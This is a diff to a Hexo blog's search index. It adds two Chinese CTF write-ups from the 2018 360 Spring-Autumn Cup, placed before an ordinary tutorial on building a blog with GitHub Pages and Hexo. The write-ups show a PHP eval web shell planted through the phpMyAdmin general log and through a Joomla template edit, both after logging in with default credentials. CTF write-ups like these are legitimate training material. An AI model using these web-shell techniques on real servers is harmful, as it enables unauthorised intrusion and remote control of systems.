@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[“360企业安全春秋杯”网络安全技术大赛----线上赛题（二）Writeup]]></title>
+    <url>%2F2018%2F04%2F18%2F2018-04-18-Writeup02%2F</url>
+    <content type="text"><![CDATA[“360企业安全春秋杯”网络安全技术大赛—-线上赛题（二）Writeup主体思路利用phpmyadmin中记录查询日志功能，成功将一句话写入服务器中，之后菜刀连接拿到shell 具体实现1.老生常谈的问题，御剑扫后台发现phpMyAdmin2.猜测用户名密码都为root成功登入phpMyAdmin，打开服务器变量设置界面将general log的值修改为ON，表示运行得到sql语句将会被记录成文件general log file 的值phpStudy之前的部分全部不动，之后添加www字段，后面随便写一个php文件名，这个文件将是未来你菜刀连接的文件3.回到sql界面，键入如下代码，将一句话添加到日志文件中1select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; 执行成功4.利用中国菜刀与之前自己命名的日志文件进行连接，成功拿到shell5.进C盘拿到flag]]></content>
+      <categories>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[“360企业安全春秋杯”网络安全技术大赛----线上赛题（一）Writeup]]></title>
+    <url>%2F2018%2F04%2F18%2F2018-04-18-Writeup01%2F</url>
+    <content type="text"><![CDATA[“360企业安全春秋杯”网络安全技术大赛—-线上赛题（一）Writeup主体思路利用joomla选择模板并且能自己编写网页文件的漏洞，将一句话木马写入网页中，之后菜刀连接拿到shell 具体实现 1.首先第一步用御剑扫描目标主机后台，发现administrator登陆界面，猜测用户名密码均为admin，成功进入后台管理界面2.点击Extensions中的templates进入选择模板界面这里选择第一个模板3.之后发现模板文件可以修改，将index.php清空并写入一句话 1&lt;?php eval($_POST[cmd]);?&gt; 4.点击save&amp;close之后退到templates选择界面，点击左侧styles将之前做更改的模板选上星，表示选中模板。5.打开中国菜刀，输入指定ip和密码，也就是cmd，成功拿到shell6.查看C盘下的flag]]></content>
+      <categories>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[独立博客搭建（一）----- github pages + hexo 搭建属于自己的专属博客]]></title>
     <url>%2F2018%2F04%2F16%2F2018-04-16-Blog01%2F</url>
     <content type="text"><![CDATA[独立博客搭建（一）—– github pages + hexo 搭建属于自己的专属博客写在最前你为什么要写博客？这里用我的博客关于中的部分文字来解释下 写博客的本意首先是为了记录自己学习生活中遇到的问题和解决问题的方法，这样以后遇到同类问题或者是与之相似的问题就可以回来翻翻博客寻找答案。其次记录博客的过程其实是二次学习的过程。在写博客的过程中，能及时对自己学过的知识进行复习和总结，加深自己对当前问题的理解 再次就是希望自己解决问题的过程对他人能够有所帮助。因为自己也常年混迹各大博客圈，明白一篇好的技术博客能给人提供很多思路。我也希望我的博文能够给大家提供不一样的思路。 如果你也有一颗爱分享的心，希望自己的博客能为别人提供哪怕是一点点的帮助，请往下看 首先你得爱折腾，搭建博客这个事情说容易也不太容易，需要你有足够的耐心，ok，开始 GitHub Pages 是什么GitHub Pages 是通过我们网站托管和发布的公开网页，它是免费的。GitHub Pages上所有的代码是开源的无法进行后端的操作，所以要用到后面对的hexo框架。GitHub Pages 是通过 HTTP 服务的，不是 HTTPS，所以你不应该使用它处理敏感的事务，像发送密码或者信用卡号码。 注册github点击这里进入github官网，注册账号 创建仓库如果你还不了解仓库是什么的话，后续我会在我的博客 中具体讲解github的用法创建仓库按如图的步骤这里的仓库名称设置成你的github名称.github.io 如 marsguest.github.io 如果你未来不单独购买域名的话，这个名称就是你博客的域名。之后你在博客的setting中可以看得到下图的界面这时github pages 服务就开启了，换句话说，如果你在仓库中放一个index.html，之后访问我之前说的那个域名你就能看到index这个网页了. 安装和配置Git安装Git，在这个网址中选择对应自己系统的版本进行安装安装过程一路next即可 配置ssh我们知道github主要功能是代码托管，那么远端的服务器如何和我们主机内的文件连接起来呢？就是通过ssh 1.检查自己主机的ssh 设置1$ cd ~/. ssh 如果显示“No such file or directory”，说明这是你第一次使用 git 2.生成新的ssh keys1$ ssh-keygen -t rsa -C &quot;xxx@youremail.com&quot; 这里的邮件就是你注册时用的邮件地址之后回显 12Generating public/private rsa key pair.Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 直接回车即可 然后系统要求你输入密码 12Enter passphrase (empty for no passphrase):Enter same passphrase again: 这里输入的密码就是在你将本机的文件推到github上时用到的密码，它防止用你电脑的人随意该动云端的数据。ps：输入密码时没有回显出现如图文字，设置ssh成功 3、添加SSH Key到GitHub我们这里只是在本机生成了一个ssh，我们还得让远端的服务器知道，这步就是通知远程服务器的。在添加ssh成功的时候系统会返给你如下的文字它告诉了你ssh key 存在了哪里没找到的勾选一下文件扩展名 隐藏的项目将id_rsa.pub这个文件以记事本打开，复制内容到剪切板。进入github官网点击头像中的settingtitle写成blog即可，key就是将之前那个文件的内容复制到这。之后点击Add SSH key 4.对添加的ssh进行测试在随意位置的打开git bash键入以下代码（注意：原封不动的输就行） 1$ ssh -T git@github.com 看到如下反馈： 123The authenticity of host &apos;GitHub.com (207.97.227.239)&apos; can&apos;t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no) yes之后回车 1Enter passphrase for key &apos;/c/Users/lenovo/.ssh/id_rsa&apos;: 输入刚刚设置的密码回车之后你会看到 successfully 5.设置用户信息胜利在望，以下是完善个人信息的部分： 12$ git config --global user.name &quot;marsguest&quot;//输入注册时的username$ git config --global user.email &quot;amrsguest@126.com&quot;//填写注册邮箱 ssh配置到此就完成了。 搭建hexo博客什么是hexo它是一个快速，简单和功能强大的博客框架.这里主要讲一下它和jekyll框架之间的区别吧。 jekyll具体实现就是你将自己的全部文件放到你clone下来的自己的本地仓库中，之后将整个仓库文件推到github，github会自动的调用jekyll框架来解析你的文件，将你的文件中的各种文件转化成网页文件，这件事是交给github做的。换句话说，倘若你在浏览别人的博客中发现他用的是jekyll框架搭建的，那么这个时候你直接进入他的.github.io的仓库中将代码原封不动的转到自己的github pages的仓库中即可，之后你输入自己的网址就能看到和他一模一样的界面 但是hexo和jekyll的工作原理不同，hexo 必须安装git 而不是github desktop，这和hexo的工作原理有关。hexo你在建立了自己的博客后，将博客中各种文件（如Markdown文件）转化成网页这件事是在你本机上完成，转化之后将生成好的html文件以及他所需要的各种资源（如js，css，images）通过git传到github上，换句话说，如果你在网上看到一片好的博客，它是利用hexo框架编的，这时你去博主的github中找源码是找不到他的初始文件的，只能看到一个个html。初始文件只在本机上有，github上存在的只是生成好的html。 了解了工作原理，下面我们进入具体的搭建步骤1.安装Node.js由于hexo是基于Node.js 的这里我们首先安装Node.js2.安装hexo在你认为合适的地方建立一个文件夹命名为Blog （这个名字无所谓）之后通过cmd cd进入这个文件夹键入npm install hexo -g 开始安装hexo之后键入hexo -v 若出现各种版本信息，则安装成功3.本机初始化博客文件夹之后的各个步骤都是在Blog文件夹里面的 1$ hexo init //初始化你的博客，过程可能有点漫长 安装依赖包1$ npm install 确保git部署1$ npm install hexo-deployer-git --save 本机试运行输入如下指令 12hexo g //主要就是将你的文件转化成网页hexo s //启动服务器默认是127.0.0.1:4000 之后你在浏览器输入127.0.0.1:4000 就能看到hexo默认主题界面了 现在你所看到的这个主题只是hexo最初始的主题，网上还有好多精美的主题供你选择，后续我将对如何配置主题进行讲解]]></content>
